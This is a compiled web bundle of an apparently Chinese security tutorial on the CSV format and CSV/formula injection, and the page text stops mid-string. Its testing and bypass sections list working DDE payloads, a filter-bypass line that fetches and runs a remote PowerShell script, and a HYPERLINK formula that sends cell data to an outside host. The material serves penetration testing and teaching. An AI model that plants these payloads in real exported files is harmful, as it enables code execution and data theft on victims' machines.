"use strict";(self.webpackChunkone_piece=self.webpackChunkone_piece||[]).push([[383],{7708:(n,s)=>{s.A=(n,s)=>{const a=n.__vccOpts||n;for(const[n,t]of s)a[n]=t;return a}},8915:(n,s,a)=>{a.r(s),a.d(s,{comp:()=>J,data:()=>R});var t=a(4754);const e=a.p+"assets/img/image-20240407134804-c7w6sg0.4c86fb32.png",p=a.p+"assets/img/image-20240314135027-g5hayvd.a188f85b.png",o=a.p+"assets/img/image-20240327104514-mbmpdmj.4543eaa7.png",c=a.p+"assets/img/image-20240407142709-lxrfk0l.2b62bd3a.png",l=a.p+"assets/img/image-20240407142848-2lcyw5q.785f0da6.png",i=a.p+"assets/img/image-20240407143214-kfe8a00.c1685feb.png",u=a.p+"assets/img/image-20240407144127-4cgm2yz.49bf0dd0.png",r=a.p+"assets/img/image-20240407144913-qv5k54e.cf0f26af.png",d=a.p+"assets/img/image-20240407150613-tbz77hx.451d7949.png",k=a.p+"assets/img/image-20240407151015-9k50g8w.2bde836b.png",m=a.p+"assets/img/image-20240407152304-9popdwp.b9838268.png",g=a.p+"assets/img/image-20240407152719-3fk0exd.20c249c0.png",v=a.p+"assets/img/image-20240407162659-c019vur.8d78a1dc.png",b=a.p+"assets/img/image-20240407163507-wv2hca5.249b1d11.png",h=(0,t.Lk)("h1",{id:"csv-概述",tabindex:"-1"},[(0,t.Lk)("a",{class:"header-anchor",href:"#csv-概述"},[(0,t.Lk)("span",null,"CSV 概述")])],-1),A={href:"https://zh.wikipedia.org/zh-cn/%E9%80%97%E5%8F%B7%E5%88%86%E9%9A%94%E5%80%BC",target:"_blank",rel:"noopener noreferrer"},q=(0,t.Lk)("p",null,[(0,t.Lk)("strong",null,"逗号分隔值"),(0,t.eW)("（Comma-Separated Values，"),(0,t.Lk)("strong",null,"CSV"),(0,t.eW)("，有时也称为"),(0,t.Lk)("strong",null,"字符分隔值"),(0,t.eW)("，因为分隔字符也可以不是逗号），其文件以"),(0,t.Lk)("mark",null,"纯文本形式"),(0,t.eW)('存储表格数据（数字和文本）。纯文本意味着该文件是一个字符 "字符 (计算机科学)")序列，不含必须像二进制数字那样被解读的数据。')],-1),f=(0,t.Lk)("p",null,[(0,t.eW)("CSV 格式在发展过程中也逐渐演变出其他一些分支和变种。从名字（Comma-Separated-Value）可以看出，坚持使用逗号才是正规的做法。但有些程序也开始使用 Tab 或管道符（"),(0,t.Lk)("code",null,"|"),(0,t.eW)("​），甚至其他更多符号来进行分割。 在格式变化的同时，有的程序继续沿用 CSV 的名称，有的则引入了其他稍有变化的名字，比如 DSV（Delimiter-Separated Values）。这使得局面变得有点混乱，而这种混乱，到现在仍然在延续...")],-1),w={href:"https://datatracker.ietf.org/doc/html/rfc4180",target:"_blank",rel:"noopener noreferrer"},C=(0,t.Lk)("p",null,[(0,t.Lk)("strong",null,"公式注入（Formula Injection）攻击")],-1),x=(0,t.Lk)("p",null,"在 2013 年、2014 年就相继有人提出 Cell Injection、CSV Injection，将包含恶意命令的 excel 公式插入到可以导出 csv 或 xls 等格式的文本中，诱导受害者打开带有恶意公式的 Excel 文件，在打开文件后执行 Excel 公式。凡是带这种公式计算功能的表格处理软件或多或少都会受影响，如 WPS、LibreOffice 等等。",-1),E={href:"http://www.contextis.com/resources/blog/comma-separated-vulnerabilities/?ref=blog.zsec.uk",target:"_blank",rel:"noopener noreferrer"},y=(0,t.Fv)('<p>现在越来越多的云端产品都提供了数据<strong>导出为 CSV、xlsx 文件格式</strong>，如果能控制它们的数据源，并且未做内容验证，就可以触发公式注入，最近我在一些内部平台中就相继发现不少这类问题。</p><h1 id="csv-特性" tabindex="-1"><a class="header-anchor" href="#csv-特性"><span>CSV 特性</span></a></h1><h2 id="分割符" tabindex="-1"><a class="header-anchor" href="#分割符"><span>分割符</span></a></h2><ul><li><p>CSV 的基本格式是逗号分隔的一系列字段。同时规范要求，所有字段都可以用引用符号（通常是双引号 <code>&quot;</code>​​ ）包围起来。因此，以下两行数据在语义上是完全相同的：</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>shenzhen,2019,china\n&quot;shenzhen&quot;,&quot;2019&quot;,&quot;china&quot;\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>至于何时应该加引号、何时不加，规范并无明确要求，而是把这个决定留给应用程序。<strong>但如果字段内容中出现了逗号，为了避免歧义，就必须加上引号。</strong> 此外，如果字段内容中存在空白字符的话，为了明确起见，一般也建议加上。</p></li><li><p>如果字段内容中本来就有引号，该怎么办呢？<strong>那就需要在前面再加一个引号</strong>。</p><p>比如：</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>shenzhen,2019,&quot;known as &quot;&quot;Special region&quot;&quot;&quot;\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>你可能在某些地方看到类似 C 语言的转义符用方法：</p><div class="language-c line-numbers-mode" data-ext="c" data-title="c"><pre class="language-c"><code>shenzhen<span class="token punctuation">,</span><span class="token number">2019</span><span class="token punctuation">,</span><span class="token string">&quot;known as \\&quot;Special region\\&quot;&quot;</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>但这只是部分程序的行为，并不是规范的做法，也不为许多标准的 CSV 库所支持。</p><p>如果使用引号的话，还需要注意：按照规范要求，<strong><mark>引号与逗号之间不应该存在空白</mark></strong>。因此，下面的内容严格来说是非法的。</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>&quot;shenzhen&quot; , &quot;2019&quot; , &quot;china&quot;\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>但对于类似这样的错误该如何处理，标准也没有明确规定。有些“聪明”的软件会自动尝试去掉空格。</p></li><li><p>excel 的一个特性：单元格中的第一个字符是“<code>+</code>​、<code>-</code>​、<code>@</code>​、<code>=</code>​”这样的符号时，它会以一个表达式的形式被处理，不过在测试中发现 WPS 不会执行“<code>@</code>​”开头的。</p><p>例如，输入 <code>=9+1</code>​ 单元格会显示 10。</p></li></ul><p>​<img src="data:image/png;base64,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" alt="image" loading="lazy">​</p><ul><li>针对二进制流是开头是 <code>Tab (0x09)</code>​、<code>Enter (0x0D)</code>​ 也有可能造成注入。</li><li>使用 python 创建一个 csv：<code>py .\\csv_test.py</code>​</li></ul><div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token keyword">import</span> csv\n\n<span class="token comment"># 定义数据</span>\ndata <span class="token operator">=</span> <span class="token punctuation">[</span>\n    <span class="token punctuation">{</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;=&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;age&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;=1+1&quot;</span><span class="token punctuation">}</span><span class="token punctuation">,</span>\n    <span class="token punctuation">{</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;-&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;age&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;-2+3&quot;</span><span class="token punctuation">}</span><span class="token punctuation">,</span>\n    <span class="token punctuation">{</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;@&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;age&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;@2+3&quot;</span><span class="token punctuation">}</span><span class="token punctuation">,</span>\n    <span class="token punctuation">{</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;+&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;age&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;+2+3&quot;</span><span class="token punctuation">}</span><span class="token punctuation">,</span>\n<span class="token punctuation">]</span>\n\n<span class="token comment"># 定义 CSV 文件路径</span>\ncsv_file <span class="token operator">=</span> <span class="token string">&quot;data.csv&quot;</span>\n\n<span class="token comment"># 写入 CSV 文件</span>\n<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>csv_file<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">&#39;w&#39;</span><span class="token punctuation">,</span> newline<span class="token operator">=</span><span class="token string">&#39;&#39;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>\n    writer <span class="token operator">=</span> csv<span class="token punctuation">.</span>DictWriter<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> fieldnames<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;age&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>\n\n    <span class="token comment"># 写入标题</span>\n    writer<span class="token punctuation">.</span>writeheader<span class="token punctuation">(</span><span class="token punctuation">)</span>\n\n    <span class="token comment"># 写入数据</span>\n    <span class="token keyword">for</span> row <span class="token keyword">in</span> data<span class="token punctuation">:</span>\n        writer<span class="token punctuation">.</span>writerow<span class="token punctuation">(</span>row<span class="token punctuation">)</span>\n\n<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;CSV 文件已创建成功！&quot;</span><span class="token punctuation">)</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+e+'" alt="image" loading="lazy">​</p><h2 id="dde" tabindex="-1"><a class="header-anchor" href="#dde"><span>DDE</span></a></h2><p>动态数据交换（DDE），是 Windows 下进程间通信协议，支持 Microsoft Excel，LibreOffice 和 Apache OpenOffice。Excel、Word、Rtf、Outlook 都可以使用这种机制，<strong>根据外部应用的处理结果来更新内容</strong>。因此，如果我们制作包含 DDE 公式的 CSV 文件，那么在打开该文件时，Excel 就会尝试执行外部应用。</p><h1 id="漏洞挖掘" tabindex="-1"><a class="header-anchor" href="#漏洞挖掘"><span>漏洞挖掘</span></a></h1><h2 id="安全测试" tabindex="-1"><a class="header-anchor" href="#安全测试"><span>安全测试</span></a></h2><ol><li><p>查找、留意系统中是否有到导出为 csv 或 xls 格式的利用点。一般存在于信息统计，或者日志导出等地方。</p></li><li><p>确定导出的内容可控</p><ol><li>可以在界面可直接进行编辑/新增</li><li>通过数据篡改/HPP/追踪数据源等方式看是否可以控制输入</li></ol></li><li><p>如果存在注入点且有过滤，尝试绕过，最后进行 OS 执行等深入利用</p></li><li><p>其他常见 csv 注入输入场景有：</p><ol><li>burpsuite 抓取登录报文，修改<strong>用户名</strong>为&quot;<code>=cmd|&#39;/c ping 127.0.0.1 -t&#39;!A1</code>​&quot;，查看导出的安全日志中是否会执行构造的命令</li><li>操作失败日志记录场景(比如上传文件场景，将<strong>文件名</strong>修改为&quot;<code>=cmd|&#39;/c ping 127.0.0.1 -t&#39;!A1</code>​&quot;）<strong>以及其他可被用户控制的入参操作场景</strong>，且这些用户的控制入参可被记录到可导出日志中，查看导出的安全日志中是否会执行构造的命令</li></ol></li><li><p>建议构造如下数据</p></li></ol><div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token operator">=</span>cmd<span class="token operator">|</span><span class="token string">&#39;/c calc&#39;</span>!<span class="token string">&#39;A1&#39;</span>\n\\&quot;<span class="token punctuation">,</span><span class="token operator">=</span>cmd<span class="token operator">|</span><span class="token string">&#39;/c calc&#39;</span>!<span class="token string">&#39;A1&#39;</span>\n&quot;<span class="token punctuation">,</span><span class="token operator">=</span>cmd<span class="token operator">|</span><span class="token string">&#39;/c calc&#39;</span>!<span class="token string">&#39;A1&#39;</span>\nxxx，<span class="token operator">=</span>cmd<span class="token operator">|</span><span class="token string">&#39;/c calc&#39;</span>!<span class="token string">&#39;A1&#39;</span>\nxxx\\n<span class="token operator">=</span>cmd<span class="token operator">|</span><span class="token string">&#39;/c calc&#39;</span>!<span class="token string">&#39;A1&#39;</span>\n\n<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>\n在 csv 文件 和 xlsx 文件中的每一项的值如果是 <span class="token operator">=</span><span class="token punctuation">,</span> @<span class="token punctuation">,</span> <span class="token operator">+</span><span class="token punctuation">,</span> <span class="token operator">-</span> 就会被 excel 识别为一个公式， 此时可以注入系统命令实现命令执行。\n\n<span class="token comment"># 常用 payload</span>\n<span class="token operator">=</span>cmd<span class="token operator">|</span><span class="token string">&#39;/c calc&#39;</span>!A0    <span class="token comment"># 弹计算器</span>\n\n<span class="token operator">=</span>MSEXCEL<span class="token operator">|</span><span class="token string">&#39;\\..\\..\\..\\Windows\\System32\\cmd.exe /c calc.exe&#39;</span>!<span class="token string">&#39;&#39;</span> <span class="token comment"># 弹计算器</span>\n\n<span class="token operator">=</span>HYPERLINK<span class="token punctuation">(</span><span class="token string">&quot;http://vps_ip?test=&quot;</span><span class="token operator">&amp;</span>A2<span class="token operator">&amp;</span>A3<span class="token punctuation">,</span><span class="token string">&quot;Error: Please click me!&quot;</span><span class="token punctuation">)</span>  <span class="token comment"># 发起 http请求获取数据</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="6"><li>覆盖产品中所有存在导出 <code>CSV/Excel</code>​ 等格式的场景。</li></ol><h2 id="bypass" tabindex="-1"><a class="header-anchor" href="#bypass"><span>Bypass</span></a></h2><ul><li><p>在<strong>等于号</strong>被过滤的情况，可以通过运算符 <code>+-</code>​​ 的方式绕过</p><p>​<code>-1+1+cmd |&#39; /C calc&#39;!A0</code>​​</p></li><li><p>参数处输入一下 payload，由于 <code>%0A</code>​​ 被解析，从而后面的数据跳转的下一行</p><p>​<code>%0A-1+1+cmd |&#39; /C calc&#39;!A0</code>​​</p></li><li><p>导出文件为 CSV 时，若系统在等号 <code>=</code>​​ 前加了引号 <code>&#39;</code>​​ 过滤，则可以使用分号绕过，分号（<code>;</code>​​）可以分离前后两部分内容使其分别执行【此技巧和上面的换行本质是一样的，相当于在新的单元格里面写入内容】</p><p>​<code>;-3+3+cmd|&#39;/C calc&#39;!D2</code>​​</p></li><li><p>其他</p><p>​<code>@SUM(cmd|&#39;/c calc&#39;!A0)</code></p><p>​<code>@SUM(1+1)*cmd|&#39; /C calc&#39;!A0</code>​</p><p>​<code>@SUM(1+1)*cmd|&#39; /C powershell IEX(wget 0r.pe/p)&#39;!A0</code>​</p></li></ul><h1 id="注意事项" tabindex="-1"><a class="header-anchor" href="#注意事项"><span>注意事项</span></a></h1><h2 id="excel" tabindex="-1"><a class="header-anchor" href="#excel"><span>Excel</span></a></h2><p>执行外部命令需要用到 Excel 的 DDE（Dynamic Data Exchange，动态数据交换），在新版本的 Excel 中（我的为 Excel 2016）需要修改设置才能复现：</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>文件 &gt; 选项 &gt; 信任中心 &gt; 信任中心设置 &gt; 外部内容\n\n在“动态数据交换的安全设置”中勾选“启用动态数据交换服务器查找”和“启用动态数据交换服务器启动”。\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+p+'" alt="image" 